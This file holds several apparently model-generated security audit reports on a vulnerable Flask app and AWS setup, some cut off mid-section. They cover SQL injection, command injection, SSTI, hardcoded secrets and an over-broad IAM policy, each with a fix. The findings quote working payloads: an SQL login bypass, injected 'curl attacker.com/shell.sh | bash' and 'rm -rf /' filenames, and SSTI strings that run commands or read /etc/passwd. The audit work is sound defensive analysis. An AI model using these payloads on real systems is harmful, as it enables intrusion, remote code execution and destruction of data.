+        "user_id": user_id,
+        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)  # shorter TTL
+    }
+    return jwt.encode(payload, secret, algorithm="HS256")
+```
+
+Use a secrets manager (AWS Secrets Manager, HashiCorp Vault) in production. Add `.env` to `.gitignore` and rotate all exposed secrets immediately.
+
+---
+
+## VULNERABILITY 5: Plaintext Password Storage
+
+**File:** `./app/routes/auth.py`, lines 44–48; `./app/models.py`, line 9  
+**CWE:** CWE-256 — Plaintext Storage of a Password; CWE-916 — Use of Password Hash With Insufficient Computational Effort  
+**OWASP:** A02:2021 — Cryptographic Failures  
+**Severity:** 🔴 CRITICAL
+
+### Vulnerable Code
+```python
+# auth.py — password stored as-is
+user = User(username=username, password=password, email=email)
+
+# models.py — column stores raw string
+password = db.Column(db.String(120), nullable=False)
+```
+
+### Technical Explanation
+Passwords are stored in plaintext in the database. A single SQL injection, database backup leak, or insider threat exposes every user's password directly. There is no hashing, no salting, and no computational cost to cracking.
+
+### Remediation
+```python
+# Install: pip install bcrypt
+from bcrypt import hashpw, gensalt, checkpw
+
+# Registration
+hashed = hashpw(password.encode("utf-8"), gensalt())
+user = User(username=username, password=hashed.decode("utf-8"), email=email)
+
+# Login — use ORM, not raw SQL (see Vulnerability 1)
+user = User.query.filter_by(username=username).first()
+if user and checkpw(password.encode("utf-8"), user.password.encode("utf-8")):
+    token = generate_token(user.id)
+    return jsonify({"message": "Login successful", "token": token}), 200
+
+# models.py — increase column length for hash storage
+password = db.Column(db.String(255), nullable=False)
+```
+
+---
+
+## VULNERABILITY 6: Missing Authentication and Authorisation on All Endpoints
+
+**Files:** `./app/routes/users.py`, `./app/routes/files.py`  
+**CWE:** CWE-306 — Missing Authentication for Critical Function; CWE-862 — Missing Authorisation  
+**OWASP:** A01:2021 — Broken Access Control  
+**Severity:** 🔴 CRITICAL
+
+### Vulnerable Code
+```python
+# Any unauthenticated caller can delete any user
+@users_bp.route("/delete/<username>", methods=["DELETE"])
+def delete_user(username):
+    ...
+
+# Any unauthenticated caller can list all users and their emails/roles
+@users_bp.route("/", methods=["GET"])
+def get_all_users():
+    ...
+
+# Any unauthenticated caller can delete any file by ID
+@files_bp.route("/delete/<int:file_id>", methods=["DELETE"])
+def delete_file(file_id):
+    ...
+```
+
+### Technical Explanation
+No route validates a JWT token or session before performing privileged operations. An unauthenticated attacker can enumerate all users (including emails and roles), delete arbitrary users, and delete arbitrary files. There is also no ownership check — authenticated user A can delete user B's files (Insecure Direct Object Reference, IDOR).
+
+### Remediation
+```python
+# app/utils/auth.py
+import jwt, os
+from functools import wraps
+from flask import request, jsonify
+
+def require_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        auth_header = request.headers.get("Authorization", "")
+        if not auth_header.startswith("Bearer "):
+            return jsonify({"error": "Unauthorised"}), 401
+        token = auth_header.split(" ", 1)[1]
+        try:
+            payload = jwt.decode(token, os.environ["JWT_SECRET_KEY"], algorithms=["HS256"])
+            request.current_user_id = payload["user_id"]
+        except jwt.ExpiredSignatureError:
+            return jsonify({"error": "Token expired"}), 401
+        except jwt.InvalidTokenError:
+            return jsonify({"error": "Invalid token"}), 401
+        return f(*args, **kwargs)
+    return decorated
+
+def require_role(role):
+    def decorator(f):
+        @wraps(f)
+        @require_auth
+        def decorated(*args, **kwargs):
+            user = User.query.get(request.current_user_id)
+            if not user or user.role != role:
+                return jsonify({"error": "Forbidden"}), 403
+            return f(*args, **kwargs)
+        return decorated
+    return decorator
+
+# Apply to routes:
+@users_bp.route("/delete/<username>", methods=["DELETE"])
+@require_role("admin")
+def delete_user(username):
+    ...
+
+@files_bp.route("/delete/<int:file_id>", methods=["DELETE"])
+@require_auth
+def delete_file(file_id):
+    file_record = File.query.get(file_id)
+    # Ownership check — prevent IDOR
+    if file_record.uploaded_by != request.current_user_id:
+        return jsonify({"error": "Forbidden"}), 403
+    ...
+```
+
+---
+
+## VULNERABILITY 7: Debug Mode Enabled in Production Entry Point
+
+**File:** `./run.py`, line 4  
+**CWE:** CWE-94 / CWE-215 — Information Exposure Through Debug Information  
+**OWASP:** A05:2021 — Security Misconfiguration  
+**Severity:** 🟠 HIGH
+
+### Vulnerable Code
+```python
+app.run(debug=True)
+```
+
+### Technical Explanation
+Flask's debug mode enables the Werkzeug interactive debugger, which provides a Python REPL in the browser on any unhandled exception. This REPL is protected by a PIN, but the PIN is derivable from filesystem information accessible to an attacker with partial read access. Debug mode also enables auto-reloading and exposes detailed stack traces.
+
+### Remediation
+```python
+# run.py
+import os
+
+if __name__ == "__main__":
+    debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
+    app.run(debug=debug)
+```
+
+In production, use a proper WSGI server (Gunicorn, uWSGI) — never `app.run()`:
+```bash
+gunicorn -w 4 -b 0.0.0.0:8000 "app:create_app()"
+```
+
+---
+
+## VULNERABILITY 8: Overly Permissive IAM Policy — Wildcard Administrator
+
+**File:** `./infrastructure/iam-policy.json`, lines 4–9  
+**CWE:** CWE-732 — Incorrect Permission Assignment for Critical Resource  
+**OWASP:** A01:2021 — Broken Access Control  
+**Severity:** 🔴 CRITICAL
+
+### Vulnerable Code
+```json
+{
+    "Sid": "AdministratorAccess",
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+}
+```
+
+### Technical Explanation
+This statement grants every AWS action on every resource — equivalent to root access. Any principal (user, role, or service) attached to this policy can create/delete IAM users, exfiltrate S3 data, spin up EC2 instances for cryptomining, access Secrets Manager, modify billing, and more. The subsequent least-privilege statements in the same policy are rendered meaningless by this wildcard.
+
+### Remediation
+```json
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "AllowEC2Describe",
+            "Effect": "Allow",
+            "Action": [
+                "ec2:DescribeInstances",
+                "ec2:DescribeSecurityGroups",
+                "ec2:DescribeVpcs"
+            ],
+            "Resource": "*"
+        },
+        {
+            "Sid": "AllowS3ReadAccess",
+            "Effect": "Allow",
+            "Action": [
+                "s3:GetObject",
+                "s3:ListBucket"
+            ],
+            "Resource": [
+                "arn:aws:s3:::dissertation-bucket",
+                "arn:aws:s3:::dissertation-bucket/*"
+            ]
+        },
+        {
+            "Sid": "AllowCloudWatchLogs",
+            "Effect": "Allow",
+            "Action": [
+                "logs:CreateLogGroup",
+                "logs:
+
+=== RUN 4 ===
+# Security Audit Report
+
+## Executive Summary
+
+This codebase contains **multiple critical and high-severity vulnerabilities** spanning all five OWASP categories under review. The application should not be deployed to production in its current state.
+
+---
+
+## VULNERABILITY 1: SQL Injection
+
+**File:** `./app/routes/auth.py`, lines 36–38
+**CWE:** CWE-89 — Improper Neutralization of Special Elements used in SQL Command
+**OWASP:** A03:2021 — Injection
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+The login route constructs a raw SQL query via string concatenation using unsanitised user input:
+
+```python
+# VULNERABLE CODE
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+result = db.session.execute(query)
+```
+
+An attacker can bypass authentication entirely with a classic payload:
+- `username`: `admin' --`
+- `password`: `anything`
+
+This produces: `SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'`, commenting out the password check. The attacker can also use `' OR '1'='1` to dump all users.
+
+### Remediation
+Use SQLAlchemy's ORM or parameterised queries:
+
+```python
+# OPTION 1: ORM (preferred)
+user = User.query.filter_by(username=username, password=hashed_password).first()
+
+# OPTION 2: Parameterised query
+from sqlalchemy import text
+query = text("SELECT * FROM users WHERE username = :username AND password = :password")
+result = db.session.execute(query, {"username": username, "password": hashed_password})
+```
+
+---
+
+## VULNERABILITY 2: OS Command Injection
+
+**File:** `./app/routes/files.py`, lines 22–29
+**CWE:** CWE-78 — Improper Neutralization of Special Elements used in an OS Command
+**OWASP:** A03:2021 — Injection
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+User-supplied `filename` is concatenated directly into a shell command executed with `shell=True`:
+
+```python
+# VULNERABLE CODE
+result = subprocess.run(
+    "file " + filename,   # unsanitised user input
+    shell=True,           # shell interpretation enabled
+    capture_output=True,
+    text=True
+)
+```
+
+An attacker sending `filename: "test.txt; rm -rf / --no-preserve-root"` or `filename: "x; curl http://attacker.com/shell.sh | bash"` achieves arbitrary remote code execution (RCE) on the server.
+
+### Remediation
+Pass arguments as a list and disable shell interpretation:
+
+```python
+import shlex
+
+# SAFE: list form prevents shell interpretation
+result = subprocess.run(
+    ["file", filename],   # list form, no shell expansion
+    shell=False,          # explicit
+    capture_output=True,
+    text=True
+)
+
+# Additionally, validate filename before use:
+import os, re
+if not re.match(r'^[\w\-. ]+$', filename):
+    return jsonify({"error": "Invalid filename"}), 400
+```
+
+---
+
+## VULNERABILITY 3: Server-Side Template Injection (SSTI)
+
+**File:** `./app/routes/templates.py`, lines 12–20
+**CWE:** CWE-94 — Improper Control of Generation of Code
+**OWASP:** A03:2021 — Injection
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+User-supplied template strings are rendered directly by a Jinja2 `Environment` with no sandboxing:
+
+```python
+# VULNERABLE CODE
+env = Environment()                        # no sandbox
+template = env.from_string(template_str)   # user-controlled
+rendered = template.render(**context)
+```
+
+An attacker can send the following payload to achieve RCE:
+
+```
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+Or to read arbitrary files:
+```
+{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
+```
+
+The `SandboxedEnvironment` partially mitigates this but is not a complete fix; the endpoint should be redesigned entirely.
+
+### Remediation
+```python
+from jinja2.sandbox import SandboxedEnvironment
+
+# Step 1: Use sandboxed environment (partial mitigation)
+env = SandboxedEnvironment()
+
+# Step 2: Whitelist allowed variables and restrict template complexity
+# Step 3: Ideally, remove user-controlled template rendering entirely.
+# Use a fixed template with user-supplied context values only:
+ALLOWED_TEMPLATES = {
+    "greeting": "Hello, {{ name }}!",
+    "notification": "You have {{ count }} messages."
+}
+template_key = data.get("template_key")
+if template_key not in ALLOWED_TEMPLATES:
+    return jsonify({"error": "Invalid template"}), 400
+template = env.from_string(ALLOWED_TEMPLATES[template_key])
+```
+
+---
+
+## VULNERABILITY 4: Hardcoded Secrets and Credentials
+
+**Files:**
+- `./app/config.py`, line 3 — Flask `SECRET_KEY`
+- `./app/routes/auth.py`, lines 13–14 — Database password
+- `./app/routes/auth.py`, line 19 — JWT signing secret
+
+**CWE:** CWE-798 — Use of Hard-coded Credentials
+**OWASP:** A02:2021 — Cryptographic Failures / A07:2021 — Identification and Authentication Failures
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+
+```python
+# app/config.py
+SECRET_KEY = "hardcoded-secret-key-123"          # in version control
+
+# app/routes/auth.py
+db_password = "supersecretdbpassword123"          # hardcoded DB credential
+secret = "jwt-secret-key-hardcoded-2024"          # hardcoded JWT secret
+```
+
+Any developer with repository access (or anyone who finds the repo publicly) can:
+1. Forge arbitrary JWT tokens using the known signing secret
+2. Impersonate any user, including admins
+3. Access the database directly using the hardcoded password
+
+### Remediation
+```python
+# app/config.py
+import os
+
+class Config:
+    SECRET_KEY = os.environ["FLASK_SECRET_KEY"]          # required; fail fast if missing
+    SQLALCHEMY_DATABASE_URI = os.environ.get(
+        "DATABASE_URL", "sqlite:///dev.db"
+    )
+
+# app/routes/auth.py
+def generate_token(user_id):
+    secret = os.environ["JWT_SECRET_KEY"]                # from environment
+    ...
+
+# Use a secrets manager in production (AWS Secrets Manager, HashiCorp Vault)
+# Add .env to .gitignore and use python-dotenv for local development
+```
+
+---
+
+## VULNERABILITY 5: Plaintext Password Storage
+
+**File:** `./app/routes/auth.py`, lines 44–47; `./app/models.py`, line 9
+**CWE:** CWE-256 — Plaintext Storage of a Password / CWE-916 — Use of Password Hash With Insufficient Computational Effort
+**OWASP:** A02:2021 — Cryptographic Failures
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+Passwords are stored and compared in plaintext:
+
+```python
+# auth.py — stored without hashing
+user = User(username=username, password=password, email=email)
+
+# models.py — column stores raw password
+password = db.Column(db.String(120), nullable=False)
+```
+
+A database breach exposes every user's password immediately. The SQL injection vulnerability (Vuln 1) makes this trivially exploitable together.
+
+### Remediation
+```python
+# Install: pip install bcrypt
+from bcrypt import hashpw, gensalt, checkpw
+
+# On registration:
+hashed = hashpw(password.encode("utf-8"), gensalt())
+user = User(username=username, password=hashed.decode("utf-8"), email=email)
+
+# On login (replace raw SQL with ORM):
+user = User.query.filter_by(username=username).first()
+if user and checkpw(password.encode("utf-8"), user.password.encode("utf-8")):
+    token = generate_token(user.id)
+    ...
+
+# Increase password column size to 255 to accommodate hash
+password = db.Column(db.String(255), nullable=False)
+```
+
+---
+
+## VULNERABILITY 6: Missing Authentication and Authorisation on Sensitive Endpoints
+
+**Files:** `./app/routes/users.py`, `./app/routes/files.py`
+**CWE:** CWE-306 — Missing Authentication for Critical Function / CWE-862 — Missing Authorisation
+**OWASP:** A01:2021 — Broken Access Control
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+Every endpoint is completely unauthenticated:
+
+```python
+# Any anonymous user can:
+DELETE /users/delete/<username>   # delete any user account
+GET    /users/                    # enumerate all users and emails
+DELETE /files/delete/<file_id>    # delete any file
+GET    /files/list                # list all files
+POST   /files/process             # trigger command injection (see Vuln 2)
+```
+
+There is no JWT validation middleware, no role check, and no ownership verification.
+
+### Remediation
+```python
+# Create an auth decorator
+import jwt
+from functools import wraps
+from flask import request, jsonify
+import os
+
+def require_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        token = request.headers.get("Authorization", "").replace("Bearer ", "")
+        if not token:
+            return jsonify({"error": "Authentication required"}), 401
+        try:
+            payload = jwt.decode(token, os.environ["JWT_SECRET_KEY"], algorithms=["HS256"])
+            request.user_id = payload["user_id"]
+        except jwt.ExpiredSignatureError:
+            return jsonify({"error": "Token expired"}), 401
+        except jwt.InvalidTokenError:
+            return jsonify({"error": "Invalid token"}), 401
+        return f(*args, **kwargs)
+    return decorated
+
+def require_admin(f):
+    @wraps(f)
+    @require_auth
+    def decorated(*args, **kwargs):
+        user = User.query.get(request.user_id)
+        if not user or user.role != "admin":
+            return jsonify({"error": "Admin access required"}), 403
+        return f(*args, **kwargs)
+    return decorated
+
+# Apply to routes:
+@users_bp.route("/delete/<username>", methods=["DELETE"])
+@require_admin
+def delete_user(username):
+    ...
+```
+
+---
+
+## VULNERABILITY 7: Debug Mode Enabled in Production Entry Point
+
+**File:** `./run.py`, line 4
+**CWE:** CWE-94 / CWE-215 — Information Exposure Through Debug Information
+**OWASP:** A05:2021 — Security Misconfiguration
+**Severity:** 🟠 HIGH
+
+### Technical Explanation
+```python
+app.run(debug=True)   # exposes interactive Werkzeug debugger
+```
+
+Flask's debug mode enables the Werkzeug interactive debugger, which provides a Python REPL in the browser on any unhandled exception. This is equivalent to handing an attacker a shell. The PIN can be brute-forced or bypassed in some Werkzeug versions.
+
+### Remediation
+```python
+if __name__ == "__main__":
+    debug = os.environ.get("FLASK_ENV") == "development"
+    app.run(debug=debug, host="127.0.0.1")  # never bind 0.0.0.0 in dev
+```
+
+---
+
+## VULNERABILITY 8: Overly Permissive IAM Policy — Wildcard Administrator
+
+**File:** `./infrastructure/iam-policy.json`, lines 4–9
+**CWE:** CWE-732 — Incorrect Permission Assignment for Critical Resource
+**OWASP:** A01:2021 — Broken Access Control
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+```json
+{
+    "Sid": "AdministratorAccess",
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+}
+```
+
+This single statement grants **full AWS administrator access** to whoever holds this policy — equivalent to root. Combined with the `SecretsManagerAccess` statement that allows `secretsmanager:DeleteSecret` on `Resource: "*"`, an attacker who compromises this identity can destroy all secrets across the account. The remaining statements are redundant given the wildcard.
+
+### Remediation
+```json
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "AllowEC2Describe",
+            "Effect": "Allow",
+            "Action": [
+                "ec2:DescribeInstances",
+                "ec2:DescribeSecurityGroups",
+                "ec2:DescribeVpcs"
+            ],
+            "Resource": "*"
+        },
+        {
+            "Sid": "AllowS3ReadAccess",
+            "Effect": "Allow",
+            "Action": [
+                "s3:GetObject",
+                "s3:ListBucket"
+            ],
+            "Resource": "arn:aws:s3:::dissertation-bucket/*"
+        },
+        {
+            "Sid": "AllowSecretsReadOnly",
+            "Effect": "Allow",
+            "Action": [
+                "secretsmanager:GetSecretValue"
+            ],
+            "Resource": "arn:aws:secretsmanager:eu-west-2:ACCOUNT_ID:secret:dissertation/*"
+        },
+        {
+            "Sid": "AllowCloudWatchLogs",
+            "Effect": "Allow",
+            "Action": [
+                "logs:CreateLogGroup",
+                "logs:CreateLogStream",
+                "logs:PutLogEvents"
+            ],
+            "Resource": "arn:aws:logs:eu-west-2:ACCOUNT_ID:log-group:/dissertation/*"
+        }
+    ]
+}
+```
+
+---
+
+## VULNERABILITY 9: S3 Bucket Publicly Accessible and Unencrypted
+
+**File:** `./infrastructure/main.tf`
+**CWE:** CWE-732 — Incorrect Permission Assignment / CWE-311 — Missing Encryption of Sensitive Data
+**OWASP:** A05:2021 — Security Misconfiguration / A02:2021 — Cryptographic Failures
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+
+**Bucket 1 — `dissertation-public-bucket`:** All four public access block settings are `false`, making the bucket and its contents publicly readable/writable depending on bucket policy.
+
+**Bucket 2 — `dissertation-unencrypted-bucket`:** No `aws_s3_bucket_server_side_encryption_configuration` resource is attached. Data at rest is unencrypted.
+
+```hcl
+# VULNERABLE
+block_public_acls       = false
+block_public_policy     = false
+ignore_public_acls      = false
+restrict_public_buckets = false
+```
+
+### Remediation
+```hcl
+# Apply to ALL buckets
+resource "aws_s3_bucket_public_access_block" "unencrypted_bucket_access" {
+  bucket = aws_s3_bucket.unencrypted_bucket.id
+
+  block_public_acls       = true
+  block_public_policy     = true
+  ignore_public_acls      = true
+  restrict_public_buckets = true
+}
+
+resource "aws_s3_bucket_server_side_encryption_configuration" "unencrypted_bucket_enc" {
+  bucket = aws_s3_bucket.unencrypted_bucket.id
+  rule {
+    apply_server_side_encryption_by_default {
+      sse_algorithm = "aws:kms"   # prefer KMS over AES256 for key rotation
+    }
+  }
+}
+
+# Remove or redesign dissertation-public-bucket entirely.
+# If public access is genuinely required, use CloudFront with OAC instead.
+```
+
+---
+
+## VULNERABILITY 10: EC2 IMDSv1 Enabled (SSRF to Credential Theft)
+
+**File:** `./infrastructure/main.tf`, lines 37–42
+**CWE:** C
+
+=== RUN 5 ===
+# Security Audit Report
+
+## Executive Summary
+
+This codebase contains **multiple critical and high-severity vulnerabilities** spanning all five OWASP categories under review. The application should not be deployed to production in its current state.
+
+---
+
+## VULNERABILITY 1: SQL Injection
+
+**File:** `./app/routes/auth.py`, lines 36–38
+**CWE:** CWE-89 — Improper Neutralization of Special Elements used in SQL Command
+**OWASP:** A03:2021 — Injection
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+The login route constructs a raw SQL query via string concatenation using unsanitised user input:
+
+```python
+# VULNERABLE CODE
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+result = db.session.execute(query)
+```
+
+An attacker can bypass authentication entirely by supplying:
+- `username`: `admin' --`
+- `password`: `anything`
+
+This transforms the query into:
+```sql
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
+```
+The password check is commented out, granting access to any account.
+
+### Remediation
+Use SQLAlchemy's ORM or parameterised queries:
+
+```python
+# SECURE: Use ORM (preferred)
+user = User.query.filter_by(username=username, password=hashed_password).first()
+
+# SECURE: Parameterised query if raw SQL is required
+from sqlalchemy import text
+query = text("SELECT * FROM users WHERE username = :username AND password = :password")
+result = db.session.execute(query, {"username": username, "password": hashed_password})
+```
+
+---
+
+## VULNERABILITY 2: OS Command Injection
+
+**File:** `./app/routes/files.py`, lines 22–29
+**CWE:** CWE-78 — Improper Neutralization of Special Elements used in an OS Command
+**OWASP:** A03:2021 — Injection
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+User-supplied `filename` is concatenated directly into a shell command executed with `shell=True`:
+
+```python
+# VULNERABLE CODE
+result = subprocess.run(
+    "file " + filename,   # unsanitised user input
+    shell=True,           # shell interpretation enabled
+    capture_output=True,
+    text=True
+)
+```
+
+An attacker supplying `filename = "foo; rm -rf / #"` or `"foo && curl attacker.com/shell.sh | bash"` achieves arbitrary remote code execution on the server.
+
+### Remediation
+Pass arguments as a list and disable shell interpretation:
+
+```python
+# SECURE
+import shlex
+
+ALLOWED_UPLOAD_DIR = "/var/app/uploads"
+
+def is_safe_path(filename: str) -> bool:
+    safe_path = os.path.realpath(os.path.join(ALLOWED_UPLOAD_DIR, filename))
+    return safe_path.startswith(ALLOWED_UPLOAD_DIR)
+
+@files_bp.route("/process", methods=["POST"])
+def process_file():
+    data = request.get_json()
+    filename = data.get("filename")
+
+    if not filename or not is_safe_path(filename):
+        return jsonify({"error": "Invalid filename"}), 400
+
+    full_path = os.path.join(ALLOWED_UPLOAD_DIR, filename)
+
+    result = subprocess.run(
+        ["file", full_path],   # list form — no shell expansion
+        shell=False,           # explicit
+        capture_output=True,
+        text=True,
+        timeout=10
+    )
+    return jsonify({"output": result.stdout}), 200
+```
+
+---
+
+## VULNERABILITY 3: Server-Side Template Injection (SSTI)
+
+**File:** `./app/routes/templates.py`, lines 13–20
+**CWE:** CWE-94 — Improper Control of Generation of Code ('Code Injection')
+**OWASP:** A03:2021 — Injection
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+A raw Jinja2 `Environment` is instantiated without a sandbox, and user-supplied template strings are rendered directly:
+
+```python
+# VULNERABLE CODE
+env = Environment()                        # no sandboxing
+template = env.from_string(template_str)   # attacker controls template_str
+rendered = template.render(**context)
+```
+
+An attacker can exfiltrate secrets or execute arbitrary code:
+```
+{{ config.SECRET_KEY }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[<n>]('/etc/passwd').read() }}
+```
+
+### Remediation
+Use `SandboxedEnvironment` and restrict what is exposed, or avoid rendering user-supplied templates entirely:
+
+```python
+from jinja2.sandbox import SandboxedEnvironment
+
+@templates_bp.route("/render", methods=["POST"])
+def render_template_custom():
+    data = request.get_json()
+    template_str = data.get("template", "")
+    context = data.get("context", {})
+
+    # Whitelist allowed context keys
+    allowed_keys = {"name", "title", "body"}
+    safe_context = {k: v for k, v in context.items() if k in allowed_keys}
+
+    env = SandboxedEnvironment()           # sandboxed — blocks dangerous attribute access
+    try:
+        template = env.from_string(template_str)
+        rendered = template.render(**safe_context)
+    except Exception:
+        return jsonify({"error": "Invalid template"}), 400
+
+    return jsonify({"rendered": rendered}), 200
+```
+
+> **Note:** Even `SandboxedEnvironment` has had historical bypasses. The safest approach is to avoid user-controlled templates entirely and use a whitelist of pre-approved templates stored server-side.
+
+---
+
+## VULNERABILITY 4: Hardcoded Credentials and Secrets
+
+**Files:**
+- `./app/config.py`, line 3
+- `./app/routes/auth.py`, lines 12 and 18
+
+**CWE:** CWE-798 — Use of Hard-coded Credentials
+**OWASP:** A02:2021 — Cryptographic Failures / A07:2021 — Identification and Authentication Failures
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+
+Three separate secrets are hardcoded in source code:
+
+```python
+# app/config.py
+SECRET_KEY = "hardcoded-secret-key-123"        # Flask session signing key
+
+# app/routes/auth.py
+db_password = "supersecretdbpassword123"        # Database credential
+secret = "jwt-secret-key-hardcoded-2024"        # JWT signing secret
+```
+
+Any developer with repository access (or anyone who obtains the source via a leak) can:
+1. Forge Flask session cookies using the `SECRET_KEY`
+2. Connect directly to the database
+3. Forge arbitrary JWT tokens, impersonating any user
+
+### Remediation
+Load all secrets from environment variables, validated at startup:
+
+```python
+# app/config.py
+import os
+
+class Config:
+    SECRET_KEY = os.environ["FLASK_SECRET_KEY"]          # raises KeyError if unset
+    JWT_SECRET  = os.environ["JWT_SECRET_KEY"]
+    SQLALCHEMY_DATABASE_URI = os.environ["DATABASE_URL"]
+    SQLALCHEMY_TRACK_MODIFICATIONS = False
+
+# app/routes/auth.py
+def generate_token(user_id):
+    secret = current_app.config["JWT_SECRET"]            # read from config, not hardcoded
+    ...
+```
+
+Use a secrets manager (AWS Secrets Manager, HashiCorp Vault) in production and inject values via environment variables in CI/CD pipelines. Add the following to `.gitignore` and use `.env` files locally:
+
+```
+.env
+*.env
+```
+
+---
+
+## VULNERABILITY 5: Plaintext Password Storage
+
+**File:** `./app/routes/auth.py`, lines 44–47
+**CWE:** CWE-256 — Plaintext Storage of a Password / CWE-916 — Use of Password Hash With Insufficient Computational Effort
+**OWASP:** A02:2021 — Cryptographic Failures
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+Passwords are stored and compared in plaintext:
+
+```python
+# VULNERABLE — password stored as-is
+user = User(username=username, password=password, email=email)
+```
+
+Combined with the SQL injection vulnerability, a database dump exposes every user's password directly. Even without SQL injection, any database breach results in immediate credential exposure.
+
+### Remediation
+Use `bcrypt` or `argon2` for password hashing:
+
+```python
+# requirements.txt — add:
+# bcrypt==4.1.2
+
+from bcrypt import hashpw, gensalt, checkpw
+
+@auth_bp.route("/register", methods=["POST"])
+def register():
+    data = request.get_json()
+    password = data.get("password", "").encode("utf-8")
+
+    hashed = hashpw(password, gensalt(rounds=12))
+    user = User(username=username, password=hashed.decode("utf-8"), email=email)
+    ...
+
+@auth_bp.route("/login", methods=["POST"])
+def login():
+    ...
+    user = User.query.filter_by(username=username).first()
+    if user and checkpw(password.encode("utf-8"), user.password.encode("utf-8")):
+        token = generate_token(user.id)
+        return jsonify({"token": token}), 200
+    return jsonify({"error": "Invalid credentials"}), 401
+```
+
+---
+
+## VULNERABILITY 6: Debug Mode Enabled in Production Entry Point
+
+**File:** `./run.py`, line 4
+**CWE:** CWE-94 / CWE-215 — Information Exposure Through Debug Information
+**OWASP:** A05:2021 — Security Misconfiguration
+**Severity:** 🟠 HIGH
+
+### Technical Explanation
+```python
+app.run(debug=True)   # exposes interactive Werkzeug debugger
+```
+
+Flask's debug mode enables the Werkzeug interactive debugger, which provides a Python REPL in the browser on any unhandled exception. This allows **unauthenticated remote code execution** if the application raises any exception in a reachable code path.
+
+### Remediation
+```python
+# run.py
+import os
+
+if __name__ == "__main__":
+    debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
+    app.run(debug=debug)
+```
+
+In production, use a proper WSGI server (Gunicorn, uWSGI) — never `app.run()`:
+```bash
+gunicorn "app:create_app()" --workers 4 --bind 0.0.0.0:8000
+```
+
+---
+
+## VULNERABILITY 7: Missing Authentication and Authorisation on All Endpoints
+
+**Files:** `./app/routes/users.py`, `./app/routes/files.py`, `./app/routes/templates.py`
+**CWE:** CWE-306 — Missing Authentication for Critical Function / CWE-862 — Missing Authorisation
+**OWASP:** A01:2021 — Broken Access Control
+**Severity:** 🟠 HIGH
+
+### Technical Explanation
+Every route — including destructive operations — is completely unauthenticated:
+
+```python
+# Anyone can delete any user
+@users_bp.route("/delete/<username>", methods=["DELETE"])
+def delete_user(username): ...
+
+# Anyone can list all users and their emails/roles
+@users_bp.route("/", methods=["GET"])
+def get_all_users(): ...
+
+# Anyone can delete any file
+@files_bp.route("/delete/<int:file_id>", methods=["DELETE"])
+def delete_file(file_id): ...
+```
+
+### Remediation
+Implement a JWT verification decorator and apply it to all sensitive routes:
+
+```python
+# app/utils/auth.py
+import jwt
+from functools import wraps
+from flask import request, jsonify, current_app
+
+def require_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        auth_header = request.headers.get("Authorization", "")
+        if not auth_header.startswith("Bearer "):
+            return jsonify({"error": "Missing token"}), 401
+        token = auth_header.split(" ", 1)[1]
+        try:
+            payload = jwt.decode(
+                token,
+                current_app.config["JWT_SECRET"],
+                algorithms=["HS256"]
+            )
+            request.current_user_id = payload["user_id"]
+        except jwt.ExpiredSignatureError:
+            return jsonify({"error": "Token expired"}), 401
+        except jwt.InvalidTokenError:
+            return jsonify({"error": "Invalid token"}), 401
+        return f(*args, **kwargs)
+    return decorated
+
+def require_role(role):
+    def decorator(f):
+        @wraps(f)
+        @require_auth
+        def decorated(*args, **kwargs):
+            # fetch user and check role
+            ...
+        return decorated
+    return decorator
+
+# Usage
+@users_bp.route("/delete/<username>", methods=["DELETE"])
+@require_role("admin")
+def delete_user(username): ...
+```
+
+---
+
+## VULNERABILITY 8: Overly Permissive IAM Policy — Wildcard Administrator
+
+**File:** `./infrastructure/iam-policy.json`, lines 4–9
+**CWE:** CWE-732 — Incorrect Permission Assignment for Critical Resource
+**OWASP:** A01:2021 — Broken Access Control
+**Severity:** 🔴 CRITICAL
+
+### Technical Explanation
+```json
+{
+    "Sid": "AdministratorAccess",
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+}
+```
+
+This single statement grants **full AWS administrator access** — equivalent to the AWS-managed `AdministratorAccess` policy. Any principal with this policy can create/delete IAM users, exfiltrate all S3 data, spin up EC2 instances for cryptomining, access all secrets, and perform any other AWS action. The subsequent least-privilege statements in the same policy are entirely redundant.
+
+### Remediation
+Apply the principle of least privilege. Grant only the specific actions required:
+
+```json
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "AllowEC2Describe",
+            "Effect": "Allow",
+            "Action": [
+                "ec2:DescribeInstances",
+                "ec2:DescribeSecurityGroups",
+                "ec2:DescribeVpcs"
+            ],
+            "Resource": "*"
+        },
+        {
+            "Sid": "AllowS3ReadAccess",
+            "Effect": "Allow",
+            "Action": [
+                "s3:GetObject",
+                "s3:ListBucket"
+            ],
+            "Resource": [
+                "arn:aws:s3:::dissertation-bucket",
+                "arn:aws:s3:::dissertation-bucket/*"
